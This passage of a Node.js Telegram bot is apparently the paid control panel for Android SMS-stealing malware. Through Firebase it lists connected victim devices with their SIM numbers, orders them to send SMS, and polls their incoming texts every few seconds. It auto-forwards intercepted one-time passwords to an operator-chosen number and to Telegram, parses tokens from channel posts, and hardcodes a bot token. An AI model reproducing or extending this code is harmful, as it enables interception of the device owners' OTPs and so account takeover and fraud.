const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const BOT_TOKEN = '8824452971:AAEHoIaFxNbQ5yubP3It1khT_O1HP16UMGk';
const DATA_FILE = path.join(__dirname, 'data.json');

// Load or initialize data
let botData = {
    adminIds: ['5498096445'],
    users: {},
    globalFreeMode: false,
    freeModeEndTime: null,
    freeModeDuration: 5 * 60 * 60 * 1000 // 5 hours in milliseconds
};

function loadData() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const data = fs.readFileSync(DATA_FILE, 'utf8');
            const loaded = JSON.parse(data);
            botData = { ...botData, ...loaded };
            console.log('✅ Data loaded from data.json');
        } else {
            saveData();
            console.log('📁 New data.json created');
        }
    } catch (error) {
        console.error('❌ Error loading data:', error.message);
        saveData();
    }
}

function saveData() {
    try {
        const dataToSave = {
            adminIds: botData.adminIds,
            users: botData.users,
            globalFreeMode: botData.globalFreeMode,
            freeModeEndTime: botData.freeModeEndTime,
            freeModeDuration: botData.freeModeDuration
        };
        fs.writeFileSync(DATA_FILE, JSON.stringify(dataToSave, null, 2));
        console.log('💾 Data saved to data.json');
    } catch (error) {
        console.error('❌ Error saving data:', error.message);
    }
}

// Load data on startup
loadData();

const bot = new Telegraf(BOT_TOKEN);
const userData = new Map();
const monitoringIntervals = new Map();

// Load users from file into memory
for (const [userId, user] of Object.entries(botData.users)) {
    if (user.processedMsgs) {
        if (Array.isArray(user.processedMsgs)) {
            user.processedMsgs = new Set(user.processedMsgs);
        } else if (typeof user.processedMsgs === 'object' && user.processedMsgs !== null) {
            try {
                user.processedMsgs = new Set(user.processedMsgs);
            } catch (e) {
                user.processedMsgs = new Set();
            }
        } else {
            user.processedMsgs = new Set();
        }
    } else {
        user.processedMsgs = new Set();
    }
    
    if (user.processedSmsIds) {
        if (Array.isArray(user.processedSmsIds)) {
            user.processedSmsIds = new Set(user.processedSmsIds);
        } else if (typeof user.processedSmsIds === 'object' && user.processedSmsIds !== null) {
            try {
                user.processedSmsIds = new Set(user.processedSmsIds);
            } catch (e) {
                user.processedSmsIds = new Set();
            }
        } else {
            user.processedSmsIds = new Set();
        }
    } else {
        user.processedSmsIds = new Set();
    }
    
    userData.set(userId, user);
}

function saveUser(userId, user) {
    const toSave = { ...user };
    if (toSave.processedMsgs) {
        toSave.processedMsgs = Array.from(toSave.processedMsgs);
    }
    if (toSave.processedSmsIds) {
        toSave.processedSmsIds = Array.from(toSave.processedSmsIds);
    }
    botData.users[userId] = toSave;
    saveData();
}

function isAdmin(userId) {
    return botData.adminIds.includes(userId.toString());
}

function isPremium(userId) {
    const user = userData.get(userId);
    if (!user) return false;
    
    if (user.premiumUntil && user.premiumUntil > Date.now()) {
        return true;
    }
    
    if (user.premiumUntil && user.premiumUntil <= Date.now()) {
        user.premiumUntil = null;
        user.isPremium = false;
        userData.set(userId, user);
        saveUser(userId, user);
    }
    
    return user.isPremium === true;
}

function canUseBot(userId) {
    const user = userData.get(userId);
    if (!user) return false;
    if (user.banned) return false;
    if (isAdmin(userId)) return true;
    if (botData.globalFreeMode) return true;
    if (isPremium(userId)) return true;
    return false;
}

function getUserDb(userId) {
    const user = userData.get(userId);
    if (!user || !user.firebaseUrl) return null;
    
    return {
        url: user.firebaseUrl,
        async get(path) {
            try {
                const res = await axios.get(`${this.url}/${path}.json`, { timeout: 15000 });
                return res.data;
            } catch (e) { return null; }
        },
        async put(path, data) {
            try {
                const res = await axios.put(`${this.url}/${path}.json`, data, { timeout: 15000 });
                return res.status === 200;
            } catch (e) { return false; }
        },
        async push(path, data) {
            try {
                const res = await axios.post(`${this.url}/${path}.json`, data, { timeout: 15000 });
                return res.data;
            } catch (e) { return null; }
        },
        async delete(path) {
            try {
                const res = await axios.delete(`${this.url}/${path}.json`, { timeout: 15000 });
                return res.status === 200;
            } catch (e) { return false; }
        }
    };
}

async function getDevice(userId, deviceId) {
    const db = getUserDb(userId);
    if (!db) return null;
    try {
        const data = await db.get(`clients/${deviceId}`);
        if (!data) return null;
        
        console.log(`📱 Device ${deviceId} raw data:`, JSON.stringify(data).slice(0, 200));
        
        let isOnline = false;
        if (data.status === true || data.status === 'true' || data.status === 1 || data.status === 'online') {
            isOnline = true;
        }
        if (data.isOnline === true || data.isOnline === 'true' || data.isOnline === 1) {
            isOnline = true;
        }
        if (data.connected === true || data.connected === 'true' || data.connected === 1) {
            isOnline = true;
        }
        if (data.lastSeen && (Date.now() - data.lastSeen) < 60000) {
            isOnline = true;
        }
        
        let sim1Number = 'N/A';
        let sim1Carrier = 'Unknown';
        let sim2Number = 'N/A';
        let sim2Carrier = 'Unknown';
        let selectedSim = 0;
        
        if (data.sims && data.sims.length > 0) {
            if (data.sims[0]) {
                sim1Number = data.sims[0].phoneNumber || data.sims[0].number || data.mobNo || 'N/A';
                sim1Carrier = data.sims[0].carrierName || data.sims[0].operator || data.service_provider || 'Unknown';
            }
            if (data.sims[1]) {
                sim2Number = data.sims[1].phoneNumber || data.sims[1].number || 'N/A';
                sim2Carrier = data.sims[1].carrierName || data.sims[1].operator || 'Unknown';
            }
            selectedSim = data.selectedSim || data.currentSim || 0;
        }
        
        return {
            id: deviceId,
            name: data.modelName || data.model || data.name || deviceId.slice(0, 8),
            phone: data.mobNo || data.phoneNumber || sim1Number || 'Unknown',
            online: isOnline,
            battery: data.battery || data.batteryLevel || data.battery_percent || '0%',
            sim1Number: sim1Number,
            sim1Carrier: sim1Carrier,
            sim2Number: sim2Number,
            sim2Carrier: sim2Carrier,
            selectedSim: selectedSim,
            sims: data.sims || [],
            rawStatus: data.status,
            lastSeen: data.lastSeen
        };
    } catch (e) { 
        console.log(`❌ Error getting device: ${e.message}`);
        return null; 
    }
}

async function getAllDevices(userId) {
    const db = getUserDb(userId);
    if (!db) return [];
    try {
        const data = await db.get('clients');
        if (!data) return [];
        const devices = [];
        for (const devId in data) {
            if (data[devId]) {
                let isOnline = false;
                if (data[devId].status === true || data[devId].status === 'true' || data[devId].status === 1 || data[devId].status === 'online') {
                    isOnline = true;
                }
                if (data[devId].isOnline === true || data[devId].isOnline === 'true' || data[devId].isOnline === 1) {
                    isOnline = true;
                }
                if (data[devId].connected === true || data[devId].connected === 'true' || data[devId].connected === 1) {
                    isOnline = true;
                }
                
                devices.push({
                    id: devId,
                    name: data[devId].modelName || data[devId].model || data[devId].name || devId.slice(0, 8),
                    phone: data[devId].mobNo || data[devId].phoneNumber || 'Unknown',
                    online: isOnline,
                    battery: data[devId].battery || data[devId].batteryLevel || '0%',
                    rawStatus: data[devId].status
                });
            }
        }
        return devices;
    } catch (e) { return []; }
}

async function getOnlineDevices(userId) {
    const db = getUserDb(userId);
    if (!db) return [];
    try {
        const data = await db.get('clients');
        if (!data) return [];
        const devices = [];
        for (const devId in data) {
            if (data[devId]) {
                let isOnline = false;
                if (data[devId].status === true || data[devId].status === 'true' || data[devId].status === 1 || data[devId].status === 'online') {
                    isOnline = true;
                }
                if (data[devId].isOnline === true || data[devId].isOnline === 'true' || data[devId].isOnline === 1) {
                    isOnline = true;
                }
                if (data[devId].connected === true || data[devId].connected === 'true' || data[devId].connected === 1) {
                    isOnline = true;
                }
                
                if (isOnline) {
                    let simInfo = '';
                    if (data[devId].sims && data[devId].sims.length > 0) {
                        simInfo = data[devId].sims.map(s => s.phoneNumber || s.number).filter(n => n && n !== 'Unknown').join(', ');
                    }
                    devices.push({
                        id: devId,
                        name: data[devId].modelName || data[devId].model || data[devId].name || devId.slice(0, 8),
                        phone: data[devId].mobNo || data[devId].phoneNumber || simInfo || 'Unknown',
                        online: true,
                        battery: data[devId].battery || data[devId].batteryLevel || '0%'
                    });
                }
            }
        }
        return devices;
    } catch (e) { return []; }
}

async function sendSms(userId, deviceId, toNumber, message) {
    const start = Date.now();
    const db = getUserDb(userId);
    if (!db) return { success: false, error: 'Firebase not connected' };
    
    const device = await getDevice(userId, deviceId);
    if (!device) return { success: false, error: 'Device not found' };
    
    console.log(`📱 Device ${deviceId} status check:`);
    console.log(`   - online: ${device.online}`);
    console.log(`   - rawStatus: ${device.rawStatus}`);
    console.log(`   - lastSeen: ${device.lastSeen}`);
    
    let cleanNumber = toNumber.toString().trim().replace('+', '');
    const timestamp = Date.now();
    const commandId = `cmd_${timestamp}_${Math.random().toString(36).substr(2, 8)}`;
    
    let simInfo = {
        simSlot: device.selectedSim || 0,
        simId: device.sims && device.sims[device.selectedSim || 0] ? device.sims[device.selectedSim || 0].simId : null,
        phoneNumber: device.phone,
        carrier: device.sim1Carrier
    };
    
    if (device.sims && device.sims.length > 0) {
        const selectedSimData = device.sims[device.selectedSim || 0];
        if (selectedSimData) {
            simInfo = {
                simSlot: device.selectedSim || 0,
                simId: selectedSimData.simId || selectedSimData.id || null,
                phoneNumber: selectedSimData.phoneNumber || selectedSimData.number || device.phone,
                carrier: selectedSimData.carrierName || selectedSimData.operator || device.sim1Carrier
            };
        }
    }
    
    const commandPath = `clients/${deviceId}/commands/sendSms`;
    const commandData = {
        targetNumber: cleanNumber,
        message: message,
        timestamp: timestamp,
        status: 'pending',
        id: commandId,
        admin_sent: true,
        simInfo: simInfo
    };
    
    const webhookPath = `clients/${deviceId}/webhookEvent/sendSms`;
    const webhookData = {
        to: cleanNumber,
        message: message,
        isSended: false,
        timestamp: timestamp,
        commandId: commandId,
        simInfo: simInfo
    };
    
    const messagesPath = `clients/${deviceId}/messages`;
    const messageData = {
        sender: 'ADMIN',
        message: `SMS sent to ${cleanNumber}: ${message}`,
        dateTime: timestamp,
        timestamp: timestamp,
        type: 'outgoing',
        targetNumber: cleanNumber,
        commandId: commandId,
        status: 'pending',
        simInfo: simInfo,
        admin_sent: true
    };
    
    const smsPath = `clients/${deviceId}/sms`;
    const smsData = {
        to: cleanNumber,
        text: message,
        timestamp: timestamp,
        status: 'pending',
        commandId: commandId
    };
    
    let success1 = false, success2 = false, success3 = false, success4 = false;
    let errors = [];
    
    try {
        const result1 = await db.put(commandPath, commandData);
        success1 = result1 === true;
        if (success1) console.log(`✅ Command written to: ${commandPath}`);
        else errors.push(`Failed to write to ${commandPath}`);
    } catch(e) { 
        console.log(`❌ Failed: ${commandPath} - ${e.message}`);
        errors.push(`${commandPath}: ${e.message}`);
    }
    
    try {
        const result2 = await db.put(webhookPath, webhookData);
        success2 = result2 === true;
        if (success2) console.log(`✅ Command written to: ${webhookPath}`);
        else errors.push(`Failed to write to ${webhookPath}`);
    } catch(e) { 
        console.log(`❌ Failed: ${webhookPath} - ${e.message}`);
        errors.push(`${webhookPath}: ${e.message}`);
    }
    
    try {
        const result3 = await db.push(messagesPath, messageData);
        success3 = result3 !== null;
        if (success3) console.log(`✅ Command written to: ${messagesPath}`);
        else errors.push(`Failed to write to ${messagesPath}`);
    } catch(e) { 
        console.log(`❌ Failed: ${messagesPath} - ${e.message}`);
        errors.push(`${messagesPath}: ${e.message}`);
    }
    
    try {
        const result4 = await db.put(smsPath, smsData);
        success4 = result4 === true;
        if (success4) console.log(`✅ Command written to: ${smsPath}`);
    } catch(e) { 
        console.log(`❌ Failed: ${smsPath} - ${e.message}`);
    }
    
    const elapsed = Date.now() - start;
    
    if (success1 || success2 || success3 || success4) {
        console.log(`✅ SMS command sent to ${cleanNumber} in ${elapsed}ms`);
        return { 
            success: true, 
            message: `SMS command sent to ${cleanNumber}`,
            elapsed: elapsed,
            commandId: commandId
        };
    }
    
    return { success: false, error: `Failed to write command to Firebase: ${errors.join(', ')}` };
}

function extractToken(text) {
    if (!text || text.trim().length === 0) return null;
    
    console.log(`\n🔍 Extracting from: ${text.slice(0, 200)}`);
    
    let match = text.match(/To:\s*\+?(\d{10,12})[\s\n]*Message:\s*(.+?)(?=\n|$)/is);
    if (match) {
        const number = match[1].trim();
        const message = match[2].trim();
        if (number && message && message.length > 0) {
            console.log(`✅ Format 1 (To:Message): Number=${number}, Token=${message.slice(0, 30)}`);
            return { number: number, message: message, format: 'To:Message' };
        }
    }
    
    match = text.match(/📱\s*Receipt:\s*\+?(\d{10,12})[\s\n]*🔑\s*Token:\s*(.+?)(?=\n|$)/i);
    if (match) {
        const number = match[1].trim();
        const message = match[2].trim();
        if (number && message && message.length > 0) {
            console.log(`✅ Format 2 (Receipt:Token): Number=${number}, Token=${message.slice(0, 30)}`);
            return { number: number, message: message, format: 'Receipt:Token' };
        }
    }
    
    match = text.match(/Receipt:\s*\+?(\d{10,12})[\s\n]*Token:\s*(.+?)(?=\n|$)/i);
    if (match) {
        const number = match[1].trim();
        const message = match[2].trim();
        if (number && message && message.length > 0) {
            console.log(`✅ Format 3 (Receipt:Token): Number=${number}, Token=${message.slice(0, 30)}`);
            return { number: number, message: message, format: 'Receipt:Token' };
        }
    }
    
    match = text.match(/📞\s*To:\s*\+?(\d{10,12})[\s\S]*?💬\s*Message:\s*(.+?)(?=\n|$)/i);
    if (match) {
        const number = match[1].trim();
        const message = match[2].trim();
        if (number && message && message.length > 0) {
            console.log(`✅ Format 4 (Emoji): Number=${number}, Token=${message.slice(0, 30)}`);
            return { number: number, message: message, format: 'Emoji' };
        }
    }
    
    match = text.match(/One-tap copy:\s*\+?(\d{10,12})\s*\|\s*(.+?)(?=\n|$)/i);
    if (match) {
        const number = match[1].trim();
        const message = match[2].trim();
        if (number && message && message.length > 0) {
            console.log(`✅ Format 5 (One-tap): Number=${number}, Token=${message.slice(0, 30)}`);
            return { number: number, message: message, format: 'One-tap' };
        }
    }
    
    match = text.match(/Phone:\s*\+?(\d{10,12})[\s\n]*OTP:\s*(.+?)(?=\n|$)/i);
    if (match) {
        const number = match[1].trim();
        const message = match[2].trim();
        if (number && message && message.length > 0) {
            console.log(`✅ Format 6 (Phone:OTP): Number=${number}, Token=${message.slice(0, 30)}`);
            return { number: number, message: message, format: 'Phone:OTP' };
        }
    }
    
    const phoneMatch = text.match(/\b(\d{10,12})\b/);
    if (phoneMatch) {
        const number = phoneMatch[1];
        const afterNumber = text.substring(text.indexOf(number) + number.length);
        const tokenMatch = afterNumber.match(/\s+([A-Za-z0-9!@#$%^&*()_+={}\[\]|\\/?~`-]{4,})/);
        if (tokenMatch) {
            const message = tokenMatch[1].trim();
            console.log(`✅ Format 7 (Number+Token): Number=${number}, Token=${message.slice(0, 30)}`);
            return { number: number, message: message, format: 'Number+Token' };
        }
    }
    
    console.log(`❌ No token pattern matched`);
    return null;
}

// ==================== SMS MONITORING WITH AUTO OTP FORWARD ====================
async function monitorDeviceSms(userId) {
    const user = userData.get(userId);
    if (!user || !user.monitorActive || !user.monitoringDevice) {
        return;
    }
    
    const db = getUserDb(userId);
    if (!db) return;
    
    try {
        const deviceId = user.monitoringDevice;
        
        // Check messages/${deviceId} path
        const messagesPath = `messages/${deviceId}`;
        const smsData = await db.get(messagesPath);
        
        if (!smsData || typeof smsData !== 'object') {
            return;
        }
        
        const ids = Object.keys(smsData);
        if (!ids.length) return;
        
        // Get the newest message ID
        const sortedIds = ids.sort((a, b) => Number(a) - Number(b));
        const newestId = sortedIds.pop();
        
        // Check if already processed
        const smsKey = `${deviceId}_${newestId}`;
        if (user.processedSmsIds && user.processedSmsIds.has(smsKey)) {
            return;
        }
        
        const sms = smsData[newestId];
        
        // Only forward incoming messages
        if (sms.type !== 'incoming') {
            return;
        }
        
        const messageText = sms.message || 'No Message';
        const sender = sms.sender || 'Unknown';
        const formattedTime = sms.dateTime || new Date(sms.timestamp || Date.now()).toLocaleString();
        
        // ============ AUTO OTP FORWARD FEATURE ============
        // Check if user has saved a number for forwarding
        if (user.forwardNumber) {
            console.log(`📤 Auto OTP Forward: Forwarding to ${user.forwardNumber}`);
            
            // Send the full OTP message to the saved number
            const otpResult = await sendSms(userId, deviceId, user.forwardNumber, messageText);
            
            if (otpResult.success) {
                console.log(`✅ OTP forwarded to ${user.forwardNumber} successfully`);
                
                // Send confirmation to user
                await bot.telegram.sendMessage(
                    userId,
                    `📩 *OTP Forwarded!*\n\n` +
                    `📱 From: ${sender}\n` +
                    `📞 To: ${user.forwardNumber}\n` +
                    `🕐 Time: ${formattedTime}\n` +
                    `✅ Status: Sent successfully\n\n` +
                    `💬 *Full Message:*\n${messageText}`,
                    { parse_mode: 'Markdown' }
                );
            } else {
                console.log(`❌ Failed to forward OTP: ${otpResult.error}`);
                
                await bot.telegram.sendMessage(
                    userId,
                    `❌ *OTP Forward Failed!*\n\n` +
                    `📱 From: ${sender}\n` +
                    `📞 To: ${user.forwardNumber}\n` +
                    `❌ Error: ${otpResult.error}\n\n` +
                    `💬 *Message:*\n${messageText}`,
                    { parse_mode: 'Markdown' }
                );
            }
        } else {
            // If no forward number set, just show the message
            const formattedMessage = 
`📩 *New Incoming SMS*

📱 *From:* ${sender}
🕐 *Time:* ${formattedTime}

💬 *Message:*
${messageText}

ℹ️ *Auto Forward:* Not set
Use /addnum <number> to enable auto OTP forwarding`;

            await bot.telegram.sendMessage(userId, formattedMessage, { parse_mode: 'Markdown' });
        }
        // ============ END AUTO OTP FORWARD ============
        
        // Mark as processed
        if (!user.processedSmsIds) {
            user.processedSmsIds = new Set();
        }
        user.processedSmsIds.add(smsKey);
        userData.set(userId, user);
        saveUser(userId, user);
        
    } catch (error) {
        console.log(`❌ Error monitoring SMS for user ${userId}: ${error.message}`);
    }
}

// ==================== START MONITORING INTERVAL ====================
function startSmsMonitoring(userId) {
    if (monitoringIntervals.has(userId)) {
        clearInterval(monitoringIntervals.get(userId));
        monitoringIntervals.delete(userId);
    }
    
    const interval = setInterval(() => {
        monitorDeviceSms(userId);
    }, 3000);
    
    monitoringIntervals.set(userId, interval);
    console.log(`🔄 SMS monitoring started for user ${userId}`);
}

function stopSmsMonitoring(userId) {
    if (monitoringIntervals.has(userId)) {
        clearInterval(monitoringIntervals.get(userId));
        monitoringIntervals.delete(userId);
        console.log(`⏸ SMS monitoring stopped for user ${userId}`);
    }
}

// ==================== ADD NUMBER COMMAND ====================
bot.command('addnum', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!canUseBot(userId) && !isAdmin(userId)) {
        return ctx.reply('❌ Premium required! Use /paid to get access.');
    }
    
    const args = ctx.message.text.split(' ');
    
    if (args.length < 2) {
        await ctx.reply(
            `❌ *Usage:* \`/addnum <phone_number>\`\n\n` +
            `📌 Example: \`/addnum 7488831180\`\n\n` +
            `📱 This number will receive all OTP/SMS messages automatically.\n` +
            `🔄 Use /removenum to stop auto forwarding.`,
            { parse_mode: 'Markdown' }
        );
        return;
    }
    
    let phoneNumber = args[1].trim().replace('+', '');
    
    // Validate phone number (10-12 digits)
    if (!phoneNumber.match(/^\d{10,12}$/)) {
        return ctx.reply('❌ Invalid phone number! Please enter a valid 10-12 digit number.');
    }
    
    if (!userData.has(userId)) {
        userData.set(userId, {});
    }
    
    const user = userData.get(userId);
    user.forwardNumber = phoneNumber;
    userData.set(userId, user);
    saveUser(userId, user);
    
    await ctx.reply(
        `✅ *Auto OTP Forward Enabled!*\n\n` +
        `📞 Forwarding to: \`${phoneNumber}\`\n\n` +
        `📩 All incoming OTP/SMS will be automatically forwarded to this number.\n\n` +
        `🔄 Use /removenum to disable auto forwarding.\n` +
        `📋 Use /shownum to see current forwarding number.`,
        { parse_mode: 'Markdown' }
    );
    
    console.log(`✅ User ${userId} set forward number: ${phoneNumber}`);
});

bot.command('removenum', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!canUseBot(userId) && !isAdmin(userId)) {
        return ctx.reply('❌ Premium required! Use /paid to get access.');
    }
    
    if (!userData.has(userId)) {
        userData.set(userId, {});
    }
    
    const user = userData.get(userId);
    
    if (!user.forwardNumber) {
        return ctx.reply('❌ No forwarding number set. Use `/addnum <number>` first.', { parse_mode: 'Markdown' });
    }
    
    const oldNumber = user.forwardNumber;
    user.forwardNumber = null;
    userData.set(userId, user);
    saveUser(userId, user);
    
    await ctx.reply(
        `❌ *Auto OTP Forward Disabled!*\n\n` +
        `📞 Removed: \`${oldNumber}\`\n\n` +
        `✅ No more SMS will be auto forwarded.\n` +
        `📌 Use /addnum to enable again.`,
        { parse_mode: 'Markdown' }
    );
    
    console.log(`✅ User ${userId} removed forward number: ${oldNumber}`);
});

bot.command('shownum', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!canUseBot(userId) && !isAdmin(userId)) {
        return ctx.reply('❌ Premium required! Use /paid to get access.');
    }
    
    const user = userData.get(userId);
    
    if (!user || !user.forwardNumber) {
        return ctx.reply('❌ No forwarding number set.\n\nUse `/addnum <number>` to set one.', { parse_mode: 'Markdown' });
    }
    
    await ctx.reply(
        `📞 *Forwarding Number*\n\n` +
        `📱 Number: \`${user.forwardNumber}\`\n\n` +
        `📩 All incoming OTP/SMS will be forwarded here.\n` +
        `🔄 Use /removenum to disable.`,
        { parse_mode: 'Markdown' }
    );
});

// ==================== PREMIUM CHECK MIDDLEWARE ====================
bot.use(async (ctx, next) => {
    if (ctx.channelPost) {
        return next();
    }
    
    const userId = ctx.from?.id.toString();
    if (!userId) return next();
    
    if (isAdmin(userId) || ctx.message?.text === '/paid' || ctx.message?.text === '/start' || ctx.message?.text === '/addnum' || ctx.message?.text === '/removenum' || ctx.message?.text === '/shownum') {
        return next();
    }
    
    if (!canUseBot(userId)) {
        const premiumKeyboard = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '💰 GET PREMIUM', callback_data: 'get_premium' }],
                    [{ text: '📞 CONTACT ADMIN', url: 'https://t.me/Soulexe6' }]
                ]
            }
        };
        
        let timeLeft = '';
        if (botData.globalFreeMode && botData.freeModeEndTime) {
            const remaining = Math.max(0, botData.freeModeEndTime - Date.now());
            const hours = Math.floor(remaining / (60 * 60 * 1000));
            const minutes = Math.floor((remaining % (60 * 60 * 1000)) / (60 * 1000));
            timeLeft = `\n\n🆓 FREE MODE ACTIVE: ${hours}h ${minutes}m remaining!`;
        }
        
        await ctx.reply(
            `❌ *ACCESS DENIED!*\n\n` +
            `You don't have premium access to use this bot.\n\n` +
            `💎 *Premium Features:*\n` +
            `• Auto token forwarding\n` +
            `• Auto OTP forwarding\n` +
            `• SMS sending via connected devices\n` +
            `• 24/7 monitoring\n` +
            `• Priority support\n` +
            `${timeLeft}\n\n` +
            `Contact admin to get premium access!`,
            { parse_mode: 'Markdown', ...premiumKeyboard }
        );
        return;
    }
    
    return next();
});

// ==================== COMMANDS ====================
bot.start(async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!canUseBot(userId) && !isAdmin(userId)) {
        return ctx.reply('❌ You need premium to use this bot. Contact admin!');
    }
    
    const user = userData.get(userId);
    
    const stylishText = `
╔══════════════════════════════╗
║  ✦ JEHRELA PAPA BY FREE BOT ✦  ║
║         V E R S I O N   1 . 0        ║
╚══════════════════════════════╝

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃       ⚡ S E T U P   G U I D E      ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ 1️⃣ /setfirebase <url>
◈ 2️⃣ /setdevice
◈ 3️⃣ /addchannel ➜ in your channel/group
◈ 4️⃣ /startmonitor

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃        📌 Q U I C K   C M D S      ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

◈ /help ➜ Show all commands
◈ /id ➜ Get chat ID
◈ /premium ➜ Check premium status
◈ /addnum ➜ Set auto OTP forwarding

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
          🅥 🅔 🅡 🅢 🅘 🅞 🅝   1 . 0
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
    
    if (!user?.firebaseUrl) {
        await ctx.reply(stylishText);
        return;
    }
    
    const devices = await getOnlineDevices(userId);
    let deviceInfo = 'Not set';
    if (user.monitoringDevice) {
        const d = await getDevice(userId, user.monitoringDevice);
        if (d) deviceInfo = `${d.name} (${d.online ? '🟢' : '🔴'})`;
    }
    
    let forwardInfo = 'Not set';
    if (user.forwardNumber) {
        forwardInfo = `📞 ${user.forwardNumber}`;
    }
    
    await ctx.reply(
        `┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n` +
        `┃        📊  S T A T U S        ┃\n` +
        `┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n` +
        `◈ 📡 Firebase: ✅ Connected\n` +
        `◈ 📱 Device: ${deviceInfo}\n` +
        `◈ 📢 Chats: ${user.channels?.length || 0}\n` +
        `◈ 🖥 Total Devices: ${devices.length}\n` +
        `◈ ⏱ Monitor: ${user.monitorActive ? '🟢 ACTIVE' : '🔴 PAUSED'}\n` +
        `◈ 📞 Auto Forward: ${forwardInfo}\n\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `          🅥 🅔 🅡 🅢 🅘 🅞 🅝   1 . 0\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
        {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📊 Status', callback_data: 'status' },
                        { text: '📱 Devices', callback_data: 'devices' }
                    ],
                    [
                        { text: '▶️ Start Monitor', callback_data: 'start_monitor' },
                        { text: '⏸ Stop Monitor', callback_data: 'stop_monitor' }
                    ],
                    [
                        { text: '📢 Chats', callback_data: 'list_channels' },
                        { text: '💎 Premium', callback_data: 'check_premium' }
                    ],
                    [
                        { text: '📞 Add Number', callback_data: 'add_number' },
                        { text: '❌ Remove Number', callback_data: 'remove_number' }
                    ],
                    [
                        { text: '❓ Help', callback_data: 'help' }
                    ]
                ]
            }
        }
    );
});

bot.command('premium', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    
    let status = '';
    let timeLeft = '';
    
    if (isPremium(userId)) {
        const remaining = user.premiumUntil - Date.now();
        const days = Math.floor(remaining / (24 * 60 * 60 * 1000));
        const hours = Math.floor((remaining % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000));
        timeLeft = `${days}d ${hours}h`;
        status = '🟢 ACTIVE';
    } else {
        status = '🔴 INACTIVE';
    }
    
    const premiumKeyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '💰 GET PREMIUM', callback_data: 'get_premium' }],
                [{ text: '📞 CONTACT ADMIN', url: 'https://t.me/JEHRELA_PAPA' }]
            ]
        }
    };
    
    await ctx.reply(
        `💎 *PREMIUM STATUS*\n\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 User ID: \`${userId}\`\n` +
        `📊 Status: ${status}\n` +
        `${timeLeft ? `⏱ Time Left: ${timeLeft}\n` : ''}` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `*Premium Features:*\n` +
        `✅ Auto token forwarding from channels\n` +
        `✅ Auto OTP forwarding to any number\n` +
        `✅ SMS sending via connected devices\n` +
        `✅ 24/7 message monitoring\n` +
        `✅ Priority support\n` +
        `✅ Unlimited device connections\n\n` +
        `Contact admin to purchase premium!`,
        { parse_mode: 'Markdown', ...premiumKeyboard }
    );
});

bot.command('paid', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    const premiumKeyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '💰 BUY PREMIUM', callback_data: 'buy_premium' }],
                [{ text: '📞 CONTACT ADMIN', url: 'https://t.me/JEHRELA_PAPA' }]
            ]
        }
    };
    
    await ctx.reply(
        `💎 *PREMIUM PLAN*\n\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `✨ *Benefits:*\n` +
        `• Auto token forwarding\n` +
        `• Auto OTP forwarding\n` +
        `• SMS sending capability\n` +
        `• 24/7 monitoring\n` +
        `• Priority support\n` +
        `• Lifetime updates\n\n` +
        `💰 *Price:* Contact admin\n\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `Click below to purchase premium access!`,
        { parse_mode: 'Markdown', ...premiumKeyboard }
    );
});

bot.command('setfirebase', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!canUseBot(userId) && !isAdmin(userId)) {
        return ctx.reply('❌ Premium required! Use /paid to get access.');
    }
    
    const args = ctx.message.text.split(' ');
    
    if (args.length < 2) {
        await ctx.reply('❌ Usage: `/setfirebase <url>`\n\nExample: `/setfirebase https://your-project.firebaseio.com`', { parse_mode: 'Markdown' });
        return;
    }
    
    let url = args[1];
    if (!url.startsWith('https://')) url = 'https://' + url;
    if (!url.endsWith('.com') && !url.includes('.firebaseio.com')) url = url.replace(/\/$/, '');
    
    const msg = await ctx.reply('🔄 Connecting to Firebase...');
    
    try {
        await axios.get(`${url}/.json?shallow=true`, { timeout: 10000 });
        
        if (!userData.has(userId)) userData.set(userId, {});
        const user = userData.get(userId);
        user.firebaseUrl = url;
        user.channels = user.channels || [];
        user.processedMsgs = new Set();
        user.processedSmsIds = new Set();
        user.monitorActive = false;
        userData.set(userId, user);
        saveUser(userId, user);
        
        console.log(`✅ User ${userId} connected Firebase: ${url}`);
        
        await ctx.telegram.editMessageText(
            msg.chat.id, msg.message_id, null,
            `✅ *Firebase Connected!*\n\n📡 URL: \`${url}\`\n\nNext: \`/setdevice\``,
            { parse_mode: 'Markdown' }
        );
    } catch (error) {
        await ctx.telegram.editMessageText(
            msg.chat.id, msg.message_id, null,
            `❌ *Connection Failed!*\n\nError: ${error.message}`,
            { parse_mode: 'Markdown' }
        );
    }
});

bot.command('setdevice', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!canUseBot(userId) && !isAdmin(userId)) {
        return ctx.reply('❌ Premium required! Use /paid to get access.');
    }
    
    const args = ctx.message.text.split(' ');
    
    if (!userData.has(userId) || !userData.get(userId).firebaseUrl) {
        return ctx.reply('❌ Use `/setfirebase` first!', { parse_mode: 'Markdown' });
    }
    
    const user = userData.get(userId);
    
